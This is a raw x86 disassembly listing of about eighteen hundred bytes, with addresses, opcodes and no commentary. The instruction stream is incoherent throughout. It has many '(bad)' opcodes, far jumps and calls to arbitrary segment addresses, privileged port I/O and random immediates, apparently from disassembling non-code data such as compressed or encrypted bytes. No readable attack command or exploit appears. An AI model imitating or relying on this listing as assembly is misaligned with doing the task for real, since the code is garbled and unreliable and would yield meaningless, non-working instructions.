  414ebb:	dec    esi
  414ebc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ebd:	test   DWORD PTR [edx+ebx*4-0x39],esi
  414ec1:	xchg   esi,eax
  414ec2:	call   0xe9360984
  414ec7:	fdiv   QWORD PTR [eax+0x39561a8e]
  414ecd:	or     eax,0x6173374b
  414ed2:	stos   DWORD PTR es:[edi],eax
  414ed3:	mov    al,0xda
  414ed5:	add    DWORD PTR [ebp-0x39d60f17],esp
  414edb:	ss push esi
  414edd:	stc    
  414ede:	jns    0x414f1c
  414ee0:	cdq    
  414ee1:	imul   ebx,DWORD PTR [edi+ebp*2-0x57],0xffffffa2
  414ee6:	scas   eax,DWORD PTR es:[edi]
  414ee7:	cld    
  414ee8:	mul    BYTE PTR [ebx+0x3e]
  414eeb:	sahf   
  414eec:	xchg   BYTE PTR [ebp+0x1],ah
  414eef:	mov    DWORD PTR [edx*2-0x79738cd2],edi
  414ef6:	xor    BYTE PTR [esi-0x6f],ch
  414ef9:	xchg   edx,eax
  414efa:	bound  esi,QWORD PTR [eax-0x58]
  414efd:	arpl   si,si
  414eff:	test   al,0xab
  414f01:	pop    esp
  414f02:	and    DWORD PTR [eax-0x3a],edi
  414f05:	ret    0x2078
  414f08:	sub    al,0xf2
  414f0a:	xlat   BYTE PTR ds:[ebx]
  414f0b:	(bad)  
  414f0c:	jg     0x414ebd
  414f0e:	push   esi
  414f0f:	(bad)  
  414f10:	pop    ebp
  414f11:	loop   0x414f04
  414f13:	inc    ecx
  414f14:	jo     0x414ec4
  414f16:	mov    ah,0x19
  414f18:	mov    cs,WORD PTR [edi+eiz*2-0x7bd49823]
  414f1f:	nop
  414f20:	lock fld QWORD PTR [edx-0x26165c4e]
  414f27:	test   eax,0x4426c45c
  414f2c:	jb     0x414fac
  414f2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f2f:	push   edx
  414f30:	xor    al,0x66
  414f32:	push   ds
  414f33:	push   ebx
  414f34:	jmp    0x93a5:0xbda1f97d
  414f3b:	pop    ebx
  414f3c:	ret    
  414f3d:	cdq    
  414f3e:	repz pop esp
  414f40:	ret    
  414f41:	cmc    
  414f42:	js     0x414ef3
  414f44:	ret    
  414f45:	push   0xf9ed85f3
  414f4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f4b:	jmp    0x8ca3:0x38033c1d
  414f52:	or     ah,dh
  414f54:	sub    ecx,esp
  414f56:	outs   dx,BYTE PTR ds:[esi]
  414f57:	fs fwait
  414f59:	push   ebp
  414f5a:	lock dec edi
  414f5c:	xlat   BYTE PTR ds:[ebx]
  414f5d:	je     0x414fcf
  414f5f:	push   ebx
  414f60:	and    ch,BYTE PTR [eax]
  414f62:	cli    
  414f63:	scas   eax,DWORD PTR es:[edi]
  414f64:	das    
  414f65:	mov    ah,0x95
  414f67:	xor    edi,DWORD PTR [edi-0x5f]
  414f6a:	ror    esp,1
  414f6c:	popf   
  414f6d:	loope  0x414fec
  414f6f:	mov    bl,0x3a
  414f71:	xor    BYTE PTR [edx-0x5a],0x5a
  414f75:	xor    BYTE PTR [edi+0x42],al
  414f78:	(bad)  
  414f79:	push   ebp
  414f7a:	sbb    BYTE PTR [ebx+esi*2-0x15],ah
  414f7e:	stos   BYTE PTR es:[edi],al
  414f7f:	sbb    al,bl
  414f81:	adc    eax,0xd3f1f9ee
  414f86:	jno    0x414fb6
  414f88:	ret    
  414f89:	push   edi
  414f8a:	inc    edx
  414f8b:	and    BYTE PTR [edx-0x1a6259b8],cl
  414f91:	mov    al,0x30
  414f93:	hlt    
  414f94:	(bad)
  414f99:	es push 0xffffffa1
  414f9c:	add    eax,0xdb6185ff
  414fa1:	(bad)  
  414fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fa3:	js     0x414f6c
  414fa5:	xchg   ebx,eax
  414fa6:	xchg   edx,eax
  414fa7:	iret   
  414fa8:	jnp    0x414f9e
  414faa:	(bad)  [esi+ebx*2+0x2a4113e7]
  414fb1:	xlat   BYTE PTR ds:[ebx]
  414fb2:	mov    edi,0x19ed6a4
  414fb7:	mov    BYTE PTR [edi+0x4a],ah
  414fba:	sbb    ch,bh
  414fbc:	in     eax,0x8
  414fbe:	sbb    dl,ah
  414fc0:	enter  0xfa46,0x62
  414fc4:	jno    0x414fd9
  414fc6:	and    dh,cl
  414fc8:	jmp    0x7ad59de8
  414fcd:	out    0x80,eax
  414fcf:	(bad)  
  414fd0:	sub    al,0xfb
  414fd2:	sub    BYTE PTR [ebx],bh
  414fd4:	adc    esp,DWORD PTR [ebx]
  414fd6:	mov    WORD PTR [eax+ecx*1-0x21],cs
  414fda:	lods   eax,DWORD PTR ds:[esi]
  414fdb:	push   ss
  414fdc:	pop    edi
  414fdd:	sbb    eax,0x92fb376f
  414fe2:	cmp    DWORD PTR [ecx],edi
  414fe4:	or     DWORD PTR [esi+0x4b],eax
  414fe7:	dec    ebp
  414fe8:	cld    
  414fe9:	fiadd  WORD PTR [edi-0x21687727]
  414fef:	hlt    
  414ff0:	repnz out 0x57,eax
  414ff3:	in     al,0xfa
  414ff5:	leave  
  414ff6:	push   esp
  414ff7:	xor    ebx,DWORD PTR [edi+edi*1]
  414ffa:	adc    eax,0x4f23df47
  414fff:	sub    BYTE PTR [bp+0x78],cl
  415003:	xor    DWORD PTR [edx+0x35b3e094],esi
  415009:	sbb    eax,0x4571d22b
  41500e:	mov    fs,ecx
  415010:	in     al,dx
  415011:	and    eax,0xae792c6d
  415016:	idiv   BYTE PTR [esi+edx*1]
  415019:	push   esi
  41501a:	mov    ds:0x4f7b357c,eax
  41501f:	lds    ecx,FWORD PTR [eax+eax*8]
  415022:	inc    esp
  415023:	test   DWORD PTR [edx],0x92cb2a24
  415029:	xor    al,al
  41502b:	hlt    
  41502c:	sbb    BYTE PTR [esi+0x5b48233],ch
  415032:	or     al,0xdb
  415034:	cmp    bl,al
  415036:	js     0x41502f
  415038:	(bad)  
  415039:	into   
  41503a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41503b:	sub    dh,ah
  41503d:	nop
  41503e:	rol    BYTE PTR [edx-0x11],1
  415041:	xchg   edx,eax
  415042:	inc    esp
  415043:	xor    DWORD PTR [ecx],ecx
  415045:	sti    
  415046:	call   0x4aa:0xde2f8982
  41504d:	bnd jmp 0x414fe2
  415050:	ins    BYTE PTR es:[edi],dx
  415051:	jmp    0x8586c581
  415056:	outs   dx,BYTE PTR ds:[esi]
  415057:	shl    BYTE PTR [eax],cl
  415059:	inc    ecx
  41505a:	dec    ecx
  41505b:	mov    ebx,0x5555ec5e
  415060:	hlt    
  415061:	ret    
  415062:	shl    BYTE PTR [edx+0x1e7e69a],cl
  415068:	xchg   ebx,eax
  415069:	jne    0x414ff4
  41506b:	scas   eax,DWORD PTR es:[edi]
  41506c:	push   edx
  41506d:	frstor [esi]
  41506f:	stos   BYTE PTR es:[edi],al
  415070:	inc    esi
  415071:	fld    QWORD PTR [edx+0x6b]
  415074:	aaa    
  415075:	cld    
  415076:	xchg   ebx,eax
  415077:	or     al,0x54
  415079:	add    eax,0xbd937102
  41507e:	inc    ebx
  41507f:	stc    
  415080:	pop    ebp
  415081:	jmp    0x4150ef
  415083:	fdivr  st(2),st
  415085:	shr    DWORD PTR [eax],1
  415087:	inc    esp
  415088:	xchg   edx,eax
  415089:	dec    ecx
  41508a:	sbb    al,0xd0
  41508c:	mov    eax,0x44d81833
  415091:	pop    ss
  415092:	mov    cl,BYTE PTR [edi+eiz*2-0x38fb28a2]
  415099:	out    0x78,al
  41509b:	add    eax,0x5ebe3cc5
  4150a0:	bound  ebp,QWORD PTR [edx]
  4150a2:	aaa    
  4150a3:	pop    esp
  4150a4:	jp     0x415061
  4150a6:	jge    0x41508b
  4150a8:	sub    DWORD PTR [edx],eax
  4150aa:	xor    eax,0x54be6075
  4150af:	inc    ebp
  4150b0:	xchg   edx,eax
  4150b1:	xchg   esp,eax
  4150b2:	inc    eax
  4150b3:	cmp    cl,BYTE PTR [edi+ebx*8+0x6b]
  4150b7:	xchg   ebx,eax
  4150b8:	push   esp
  4150b9:	inc    esp
  4150ba:	add    ebp,DWORD PTR [ebx+0x29]
  4150bd:	xchg   BYTE PTR [edi],ah
  4150bf:	adc    DWORD PTR [ecx+0x5219ed01],edi
  4150c5:	jnp    0x4150d4
  4150c7:	cwde   
  4150c8:	int    0x80
  4150ca:	dec    ecx
  4150cb:	xlat   BYTE PTR ds:[ebx]
  4150cc:	neg    DWORD PTR [esi-0x3b]
  4150cf:	or     eax,0xd6a0ab38
  4150d4:	push   ecx
  4150d5:	rcr    ecx,0xc0
  4150d8:	cwde   
  4150d9:	rol    BYTE PTR [edi],1
  4150db:	jl     0x4150fb
  4150dd:	push   0xffffffa7
  4150df:	cwde   
  4150e0:	imul   esi,DWORD PTR [edx-0x23],0xffffffc3
  4150e4:	push   edx
  4150e5:	inc    esi
  4150e6:	popa   
  4150e7:	movd   DWORD PTR [eax+ecx*1+0x1047588c],mm1
  4150ef:	jo     0x41513d
  4150f1:	or     al,BYTE PTR [esi]
  4150f3:	in     al,0xd6
  4150f5:	pop    esi
  4150f6:	pop    ebx
  4150f7:	pushf  
  4150f8:	sub    eax,0xf837deba
  4150fd:	lahf   
  4150fe:	call   0xaa1:0xb50b7fda
  415105:	ror    BYTE PTR [ebx],1
  415107:	shr    DWORD PTR [ebx],cl
  415109:	mov    ebp,0x5c0ad752
  41510e:	xchg   edx,eax
  41510f:	xchg   edx,eax
  415110:	or     BYTE PTR [esi+0x23e14eda],bl
  415116:	stos   DWORD PTR es:[edi],eax
  415117:	imul   ebp,esi,0x8
  41511a:	push   es
  41511b:	inc    ebp
  41511c:	(bad)
  41511f:	jl     0x4150b5
  415121:	imul   ecx,DWORD PTR [ebp-0x65],0x40
  415125:	inc    eax
  415126:	(bad)  
  415127:	loop   0x415175
  415129:	test   eax,0x2005f88f
  41512e:	mov    cl,0x7d
  415131:	adc    DWORD PTR [ebp-0x1c68cc59],ebp
  415137:	scas   eax,DWORD PTR es:[edi]
  415138:	mov    al,ds:0xfb7508cf
  41513d:	xor    al,0xbc
  41513f:	stos   DWORD PTR es:[edi],eax
  415140:	xchg   DWORD PTR [ecx+0x1d],ecx
  415143:	mov    dh,0x2d
  415145:	lock and bh,BYTE PTR [eax-0x1993349f]
  41514c:	add    ah,BYTE PTR [edx+0x30f93a70]
  415152:	outs   dx,DWORD PTR ds:[esi]
  415153:	lods   al,BYTE PTR ds:[esi]
  415154:	ins    BYTE PTR es:[edi],dx
  415155:	xchg   esp,eax
  415156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415157:	fwait
  415158:	rcr    BYTE PTR [esi],cl
  41515a:	lods   eax,DWORD PTR ds:[esi]
  41515b:	(bad)  
  41515c:	jbe    0x41518d
  41515e:	imul   esi,DWORD PTR ds:[edx],0x9b2f5523
  415165:	aas    
  415166:	mov    ah,0x11
  415168:	and    ecx,DWORD PTR [ecx+0x65]
  41516b:	xchg   edi,eax
  41516c:	sbb    BYTE PTR [edx+0x5aacaa64],dh
  415172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415173:	push   0x7075d764
  415178:	popf   
  415179:	test   BYTE PTR [ebx-0x43],al
  41517c:	mov    cl,0x38
  41517e:	mov    ah,BYTE PTR [si-0x1e8]
  415183:	mov    esp,0xacf893de
  415188:	es sti 
  41518a:	add    dl,BYTE PTR [ecx+0x3d]
  41518d:	xchg   edi,eax
  41518e:	xchg   ebx,eax
  41518f:	mov    ecx,0xdcb8f6cb
  415194:	push   eax
  415195:	push   edx
  415196:	sbb    cl,BYTE PTR [ebx]
  415198:	stc    
  415199:	rcl    BYTE PTR [edx],1
  41519b:	imul   ebx,esp,0xffffffc3
  41519e:	xchg   ebp,eax
  41519f:	pop    ss
  4151a0:	mov    ds:0x89d57927,eax
  4151a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151a6:	(bad)  
  4151a7:	jg     0x4151f0
  4151a9:	(bad)  
  4151aa:	jne    0x41515b
  4151ac:	pop    esi
  4151ad:	push   eax
  4151ae:	mov    BYTE PTR [esi+eiz*8],bh
  4151b1:	mov    WORD PTR [ebp-0x5ac55f0f],?
  4151b7:	(bad)  
  4151b8:	ret    0x568
  4151bb:	or     eax,DWORD PTR [edx+0x713eaa1]
  4151c1:	jecxz  0x41520f
  4151c3:	or     bh,al
  4151c5:	xor    DWORD PTR [edi+0x67586554],edx
  4151cb:	aas    
  4151cc:	sub    al,0x9d
  4151ce:	ins    BYTE PTR es:[edi],dx
  4151cf:	repz xchg ebp,eax
  4151d1:	adc    dh,dh
  4151d3:	jg     0x4151ef
  4151d5:	or     eax,0xe97840dc
  4151da:	mov    ah,0xec
  4151dc:	dec    ebp
  4151dd:	retf   0x880e
  4151e0:	push   eax
  4151e1:	jo     0x415200
  4151e3:	(bad)  
  4151e4:	retf   
  4151e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151e6:	mov    al,0xa7
  4151e8:	aaa    
  4151e9:	sub    DWORD PTR [ebx+0x5a6b1f35],eax
  4151ef:	or     ecx,DWORD PTR [esi+0x7b]
  4151f2:	add    BYTE PTR [edi],ch
  4151f4:	mov    bh,0x3b
  4151f6:	or     eax,0xe02299d5
  4151fb:	add    bl,BYTE PTR [ebp+0x52ae1489]
  415201:	popf   
  415202:	cmp    ebx,DWORD PTR [esi]
  415204:	xor    DWORD PTR [ecx+0x4f],0x675eb78e
  41520b:	int    0x6
  41520d:	or     al,0x53
  41520f:	xor    al,0x8c
  415211:	fbld   TBYTE PTR [eax+0x54]
  415214:	fiadd  WORD PTR [edx+0x513d8ce5]
  41521a:	and    al,0x7
  41521c:	sbb    al,0x61
  41521e:	fadd   QWORD PTR [edx+0x70]
  415221:	dec    esp
  415222:	popa   
  415223:	call   FWORD PTR [eax+esi*2+0x30e0d7c]
  41522a:	pop    ds
  41522b:	or     ah,BYTE PTR [edi-0x2c]
  41522e:	sbb    eax,edx
  415230:	cld    
  415231:	pop    es
  415232:	test   DWORD PTR [edi-0xfa7073c],eax
  415238:	sbb    BYTE PTR ds:0x12f8312f,dh
  41523e:	(bad)  
  41523f:	shr    BYTE PTR [ecx+0x1c31c925],cl
  415245:	jecxz  0x41525b
  415247:	sbb    edi,DWORD PTR [eax+ebp*2]
  41524a:	and    ecx,esp
  41524c:	pop    edx
  41524d:	repz and al,0xc4
  415250:	mov    BYTE PTR [esi-0x6a],dh
  415253:	test   eax,0x9ba4729c
  415258:	in     al,0xe
  41525a:	aad    0x5f
  41525c:	in     al,dx
  41525d:	adc    al,0x49
  41525f:	inc    edi
  415260:	inc    eax
  415262:	adc    eax,0x2b9fea19
  415267:	in     eax,dx
  415268:	dec    esi
  415269:	sub    al,0x2b
  41526b:	in     eax,0x75
  41526d:	call   0xed7a:0x29af4931
  415274:	mov    esi,0x2924d10e
  415279:	or     al,BYTE PTR [ebx+eiz*8-0x17164bcc]
  415280:	gs jecxz 0x415267
  415283:	or     dl,dh
  415285:	push   edi
  415286:	lea    edx,[esi-0x70]
  415289:	arpl   WORD PTR [edx-0xc2f3728],ax
  41528f:	pop    esp
  415290:	aas    
  415291:	out    dx,al
  415292:	mov    al,ds:0xd823cd84
  415297:	lods   eax,DWORD PTR ds:[esi]
  415298:	and    DWORD PTR [eax-0x42],esi
  41529b:	call   0xebd4:0xf1f9b9bf
  4152a2:	cmp    BYTE PTR [eax],dh
  4152a4:	cmp    eax,0xeb9bf013
  4152a9:	xor    ebp,DWORD PTR [esi]
  4152ab:	shl    BYTE PTR [ecx+0x42],cl
  4152ae:	in     eax,0x14
  4152b0:	push   ecx
  4152b1:	rol    esp,0x2f
  4152b4:	xor    DWORD PTR [eax],0xffffffe6
  4152b7:	inc    ebp
  4152b8:	xchg   edx,eax
  4152b9:	inc    eax
  4152ba:	jbe    0x415336
  4152bc:	stos   BYTE PTR es:[edi],al
  4152bd:	pop    edx
  4152be:	or     al,0x48
  4152c0:	scas   eax,DWORD PTR es:[edi]
  4152c1:	dec    ebx
  4152c2:	and    esi,eax
  4152c4:	mov    ebp,0x62e392cb
  4152c9:	shl    DWORD PTR [ebp+0x1a],1
  4152cc:	cwde   
  4152cd:	pop    ebx
  4152ce:	inc    ah
  4152d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d1:	add    edi,DWORD PTR [esp+eiz*4-0x5089b318]
  4152d8:	leave  
  4152d9:	lea    eax,[esi]
  4152db:	xchg   esi,eax
  4152dc:	icebp  
  4152dd:	inc    edx
  4152de:	mov    fs,WORD PTR [esi]
  4152e0:	(bad)  
  4152e1:	mov    cl,0xdd
  4152e3:	(bad)  
  4152e4:	mov    ebx,0xafc0ea8e
  4152e9:	mov    DWORD PTR [ebx-0x61],ebp
  4152ec:	push   esp
  4152ed:	push   ecx
  4152ee:	(bad)  
  4152ef:	sbb    dh,BYTE PTR [edi-0x60]
  4152f2:	cmp    eax,0xf14ea4ef
  4152f7:	call   0x4ad14ebd
  4152fc:	sbb    DWORD PTR [edi+0x5c7ff109],edi
  415302:	xor    esp,ebp
  415304:	cs pop edi
  415306:	ds mov al,0x4f
  415309:	fnstcw WORD PTR [esi+0x1fb45161]
  41530f:	out    0x60,eax
  415311:	es xchg esi,eax
  415313:	sbb    BYTE PTR [esi-0x4a],bl
  415316:	mov    dl,0x69
  415318:	out    0xed,al
  41531a:	cmp    BYTE PTR [esi-0x23],bh
  41531d:	ins    DWORD PTR es:[edi],dx
  41531e:	inc    ebp
  41531f:	inc    ecx
  415320:	mov    gs,WORD PTR [edx+eax*4]
  415323:	ja     0x415322
  415325:	stos   BYTE PTR es:[edi],al
  415326:	cld    
  415327:	ss xchg edx,eax
  415329:	test   al,0x84
  41532b:	or     edi,ecx
  41532d:	outs   dx,DWORD PTR ds:[esi]
  41532e:	inc    ebx
  41532f:	inc    eax
  415330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415331:	sti    
  415332:	mov    eax,DWORD PTR [edi-0x47e2e12]
  415338:	mov    al,0x4a
  41533a:	nop
  41533b:	jns    0x4152c7
  41533d:	mov    bh,0xf8
  41533f:	inc    eax
  415340:	out    0xee,eax
  415342:	(bad)  
  415343:	retf   0x19cd
  415346:	mov    cl,0x7f
  415348:	aam    0xf6
  41534a:	push   ss
  41534b:	jbe    0x415330
  41534d:	jne    0x41539e
  41534f:	push   ecx
  415350:	ins    BYTE PTR es:[edi],dx
  415351:	out    0xde,eax
  415353:	test   BYTE PTR [eax+edx*2],dh
  415356:	mov    ah,0xa5
  415358:	mov    al,0xf7
  41535a:	push   ebx
  41535b:	pop    edi
  41535c:	pop    esp
  41535d:	cld    
  41535e:	gs xchg esi,eax
  415360:	call   0x4e2f:0x583ad635
  415367:	addr16 js 0x415371
  41536a:	pop    eax
  41536b:	mov    ecx,0xcdd370c5
  415370:	les    esp,FWORD PTR [eax+0x69]
  415373:	jne    0x4153da
  415375:	mov    ds:0x9e181ed7,eax
  41537a:	aaa    
  41537b:	sar    BYTE PTR [ebx+ebp*4],cl
  41537e:	scas   eax,DWORD PTR es:[edi]
  41537f:	mov    esi,0x8cb88aaf
  415384:	pop    ebp
  415385:	push   edx
  415386:	pop    ebx
  415387:	scas   al,BYTE PTR es:[edi]
  415388:	jnp    0x41537a
  41538a:	and    BYTE PTR [edi-0x2406fc00],bh
  415390:	push   0xd0b9afb9
  415395:	mov    ds:0xa8c7a366,eax
  41539a:	leave  
  41539b:	std    
  41539c:	push   ebp
  41539d:	mov    ah,0x4f
  41539f:	ror    BYTE PTR [edx+0x48],0xfb
  4153a3:	popf   
  4153a4:	sub    BYTE PTR [eax+0x3a35641d],dl
  4153aa:	push   ss
  4153ab:	or     DWORD PTR [ebx-0x56],edi
  4153ae:	mov    ds:0xf5fedf03,eax
  4153b3:	cld    
  4153b4:	ins    DWORD PTR es:[edi],dx
  4153b5:	add    eax,0x4a1cd07b
  4153ba:	cmp    bh,BYTE PTR [ebx+0x41]
  4153bd:	jnp    0x41540f
  4153bf:	test   DWORD PTR [edx+0x1e],edx
  4153c2:	jnp    0x41535c
  4153c4:	enter  0x4a17,0xc7
  4153c8:	enter  0x206d,0x8f
  4153cc:	pusha  
  4153cd:	dec    eax
  4153ce:	sahf   
  4153cf:	jne    0x415398
  4153d1:	fild   QWORD PTR [eax]
  4153d3:	out    dx,eax
  4153d4:	and    DWORD PTR [esi+0x30e8cc2],esi
  4153da:	clc    
  4153db:	ds sub ecx,DWORD PTR ds:[ebx+0x4d952051]
  4153e3:	bound  esp,QWORD PTR [eax+0x4a]
  4153e6:	jb     0x4153fb
  4153e8:	xor    bl,BYTE PTR [ebp-0x6a857143]
  4153ee:	iret   
  4153ef:	popf   
  4153f0:	sub    al,bh
  4153f2:	int3   
  4153f3:	fistp  DWORD PTR [ebx+ecx*1+0x15]
  4153f7:	mov    bh,0xff
  4153f9:	mov    ds:0x4c54ecd8,al
  4153fe:	ss cmp eax,0xdbfd760
  415404:	popa   
  415405:	shl    ebp,cl
  415407:	mov    edi,0xff0f615f
  41540c:	je     0x415426
  41540e:	call   0x213:0xd8712216
  415415:	or     esp,DWORD PTR ds:0x8ededeae
  41541b:	cmp    DWORD PTR [edi-0x12],0x8bed7fb4
  415422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415423:	adc    ah,bh
  415425:	xor    esi,0x533ac992
  41542b:	out    dx,al
  41542c:	xchg   ebp,eax
  41542d:	pop    es
  41542e:	xor    eax,0x72b0a95e
  415433:	mov    ds:0xe893330e,al
  415438:	pop    eax
  415439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41543a:	mov    esp,0x5f17c770
  41543f:	aas    
  415440:	push   ebp
  415441:	push   edx
  415442:	mov    ch,0xb1
  415444:	(bad)  
  415446:	xchg   edx,eax
  415447:	call   0x6911:0x834d9a80
  41544e:	mov    ecx,0x93f6e31f
  415453:	outs   dx,BYTE PTR ds:[esi]
  415454:	cmp    al,0x4d
  415456:	push   edi
  415457:	adc    al,0xb8
  415459:	add    eax,DWORD PTR [edx+0x70fa2c12]
  41545f:	int3   
  415460:	mov    cl,0x48
  415462:	adc    eax,0x12a1abb9
  415467:	xor    bh,BYTE PTR [ebx-0x5e345953]
  41546d:	lock ficom DWORD PTR [ecx]
  415470:	idiv   dl
  415472:	gs call 0xef572c44
  415478:	ds dec eax
  41547a:	popa   
  41547b:	mov    al,ds:0xa3ca1883
  415480:	jo     0x4154f2
  415482:	mov    bl,0xea
  415484:	jcxz   0x4154ad
  415487:	cmc    
  415488:	dec    ebp
  415489:	push   edx
  41548a:	(bad)  
  41548b:	adc    cl,BYTE PTR [edi]
  41548d:	lods   al,BYTE PTR ds:[esi]
  41548f:	mov    esi,0xf405844b
  415494:	mov    ecx,0x8f094f3a
  415499:	sbb    eax,0x6080c239
  41549e:	fs retf 
  4154a0:	adc    al,0xb7
  4154a2:	xor    DWORD PTR [eax+0x5b],eax
  4154a5:	dec    ecx
  4154a6:	sbb    ebp,DWORD PTR [edi-0x419fce12]
  4154ac:	cmp    al,0xf4
  4154ae:	sbb    BYTE PTR [eax+0x36d4ebdf],0x70
  4154b5:	fidiv  WORD PTR [edx-0x2620bd8]
  4154bb:	sbb    eax,0xb33f1ed1
  4154c0:	push   eax
  4154c1:	inc    ebp
  4154c2:	out    0xe3,eax
  4154c4:	xlat   BYTE PTR ds:[ebx]
  4154c6:	cmc    
  4154c7:	fdivr  DWORD PTR gs:0x668b1608
  4154ce:	or     DWORD PTR [eax-0x44],ecx
  4154d1:	in     eax,dx
  4154d2:	xor    DWORD PTR [edx],0xaccc781b
  4154d8:	fdivr  DWORD PTR [ebx+0x2f]
  4154db:	dec    ebp
  4154dc:	popa   
  4154dd:	iret   
  4154de:	out    dx,eax
  4154df:	xor    al,0x9
  4154e1:	(bad)  
  4154e2:	out    dx,eax
  4154e3:	push   0xb478040a
  4154e8:	hlt    
  4154e9:	scas   eax,DWORD PTR es:[edi]
  4154ea:	push   ss
  4154eb:	xchg   ebx,eax
  4154ec:	push   ds
  4154ed:	sbb    eax,DWORD PTR [edi+0x146847bd]
  4154f3:	mov    ah,0xa3
  4154f5:	out    0x1c,al
  4154f7:	loope  0x415483
  4154f9:	retf   
  4154fa:	out    0x2a,eax
  4154fc:	pop    es
  4154fd:	or     DWORD PTR [esi+esi*4+0x63],esi
  415501:	cmc    
  415502:	push   0xffffff9e
  415504:	ja     0x4154cd
  415506:	jg     0x41550f
  415508:	add    al,0xfb
  41550a:	cmp    BYTE PTR [ecx-0x4d],cl
  41550d:	(bad)  
  41550e:	stc    
  41550f:	cmp    DWORD PTR [ebx-0x7062feb4],esi
  415515:	sbb    esi,DWORD PTR [ebp-0x21]
  415518:	ja     0x415535
  41551a:	cmp    al,0x8e
  41551c:	xor    ecx,DWORD PTR [esi+0xb]
  41551f:	(bad)  
  415521:	das    
  415522:	dec    esi
  415523:	xor    DWORD PTR [esp+ecx*2-0x5f],ebx
  415527:	pop    es
  415528:	or     dh,bh
  41552a:	jb     0x415508
  41552c:	inc    ebx
  41552d:	into   
  41552e:	mov    dl,0x1f
  415530:	js     0x415549
  415532:	cdq    
  415533:	out    dx,eax
  415534:	retf   
  415535:	fisubr WORD PTR [edx-0x34]
  415538:	xlat   BYTE PTR ds:[ebx]
  415539:	push   ebx
  41553a:	sbb    eax,0x587972b5
  41553f:	cs and ebx,edx
  415542:	jge    0x41551e
  415544:	cmc    
  415545:	push   edx
  415546:	sub    ch,BYTE PTR [edi-0x16]
  415549:	ins    BYTE PTR es:[edi],dx
  41554a:	arpl   di,si
  41554c:	and    al,0x86
  41554e:	sub    BYTE PTR [ebx+0x9c5f258],dh
  415554:	or     dl,BYTE PTR [ecx]
  415556:	jg     0x4155c7
  415558:	icebp  
  415559:	sbb    esi,DWORD PTR [edx]
  41555b:	mov    ds:0x1dba8111,eax
  415560:	pop    ebp
  415561:	leave  
  415562:	inc    edi
  415563:	mov    esp,0xd9e06aee
  415568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415569:	aaa    
  41556a:	adc    eax,eax
  41556c:	sbb    BYTE PTR [ecx-0x65d409c3],dl
  415572:	dec    ecx
  415573:	xor    BYTE PTR [edx-0x60],ah
  415576:	stos   BYTE PTR es:[edi],al
  415577:	out    dx,al
  415578:	mov    dl,0x6c
  41557a:	fdiv   DWORD PTR [esi]
  41557c:	mov    al,0xcf
  41557e:	ret    
  41557f:	push   ebx
  415580:	je     0x4155fa
  415582:	push   ebp
  415583:	je     0x41556c
  415585:	fsubr  st,st(4)
  415587:	dec    edi
  415588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415589:	test   eax,0xc39fd01b
  41558e:	pop    esi
  41558f:	add    al,cl
  415591:	mov    cl,0xf
  415593:	lock js 0x41552c
  415596:	jo     0x4155ba
  415598:	push   ecx
  415599:	mov    al,ds:0xc40b5f2b
  41559e:	sub    esp,edx
  4155a0:	repnz rcr BYTE PTR [edi+0x2c],cl
  4155a4:	dec    ecx
  4155a5:	aad    0x81
  4155a7:	xchg   ebp,eax
  4155a8:	jmp    0x415596
  4155aa:	push   esp
  4155ab:	mov    dh,0x65
  4155ad:	mov    ds:0x3906a8c4,eax
  4155b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155b3:	or     dh,dh
  4155b5:	mov    edi,0x463913c0
  4155ba:	jbe    0x4155db
  4155bc:	ds mov al,0x26
  4155bf:	imul   edx,edx,0xffffff8b
  4155c2:	cli    
  4155c3:	pop    ebx
  4155c4:	add    DWORD PTR ss:[edx],edx
  4155c7:	dec    esi
  4155c8:	shl    ebx,0x3c
  4155cb:	and    al,0x24
  4155cd:	push   es
  4155ce:	ret    0xb509
  4155d1:	loop   0x415591
  4155d3:	adc    dh,ah
  4155d5:	sub    eax,0x8ad750fd
  4155da:	cmp    ch,BYTE PTR [ebp+0x3fe011c7]
  4155e0:	dec    edi
  4155e1:	(bad)  
  4155e2:	adc    bl,BYTE PTR [edx-0x659d127e]
  4155e8:	sub    BYTE PTR [edi+0x69],0xd1
  4155ec:	nop
  4155ed:	pop    ecx
  4155ee:	mov    ds:0xe9a57db5,al
  4155f3:	(bad)  
  4155f4:	aam    0xb
  4155f6:	nop
  4155f7:	(bad)  
  4155f9:	in     eax,0x5a
  4155fb:	in     al,0x69
  4155fd:	ret    0x9bf
  415600:	jecxz  0x41565c
  415602:	(bad)  
  415603:	mov    esi,0x8616a84b
  415608:	(bad)  
  415609:	xor    dl,BYTE PTR [edx+edi*8+0x6e43f961]
  415610:	xchg   esi,eax
  415611:	xchg   ebx,eax
  415612:	jmp    0x8033:0x3927344c
  415619:	inc    edi
  41561a:	je     0x4155a3
  41561c:	mov    DWORD PTR [ebp-0x7b],esp
  41561f:	std    
  415620:	pop    ds
  415621:	cmp    DWORD PTR [edi+0x14],edi
  415624:	inc    edx
  415625:	fs scas al,BYTE PTR es:[edi]
  415627:	rcr    esp,1
  415629:	hlt    
  41562a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41562b:	cmp    edi,DWORD PTR [edi-0x5]
  41562e:	out    0xa1,eax
  415630:	sub    ch,BYTE PTR [eax]
  415632:	xor    DWORD PTR [ebx],esp
  415634:	push   edx
  415635:	ret    0x740f
  415638:	jb     0x415606
  41563a:	or     al,0xda
  41563c:	jle    0x4155bf
  41563e:	scas   eax,DWORD PTR es:[edi]
  41563f:	or     al,0x10
  415641:	int3   
  415642:	sar    BYTE PTR [ebx],1
  415644:	mov    esi,0x201d2f7b
  415649:	and    BYTE PTR [esi+0x51],dh
  41564c:	xor    dh,BYTE PTR [edx]
